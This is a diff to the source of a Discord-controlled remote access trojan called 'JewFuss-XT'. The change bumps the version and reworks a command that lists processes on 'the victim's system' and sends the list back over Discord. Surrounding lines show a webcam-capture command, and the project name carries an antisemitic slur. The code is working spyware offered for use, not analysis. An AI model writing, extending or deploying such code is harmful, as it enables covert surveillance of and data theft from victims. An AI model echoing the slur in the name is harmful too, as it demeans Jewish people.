@@ -42,7 +42,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.5" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.6" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1664,12 +1664,14 @@ async def webcampic(ctx, cam: int = 0):
 
 @bot.command(help="Lists all running tasks on the victim's system.")
 async def tasks(ctx):
-    import psutil, io
+    import psutil, io, discord
     try:
         processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
+        processes.sort(key=lambda p: (p['name'] or '').lower())
         text = ""
         for proc in processes:
-            text += f"PID: {proc['pid']} - Name: {proc['name']}\n"
+            if proc['name'] and proc['name'] != "":
+                text += f"{proc['name']} - {proc['pid']}\n"
         buffer = io.BytesIO(text.encode('utf-8'))
         await ctx.send("List of running tasks:", file=discord.File(fp=buffer, filename="tasks.txt"))
     except Exception as e:
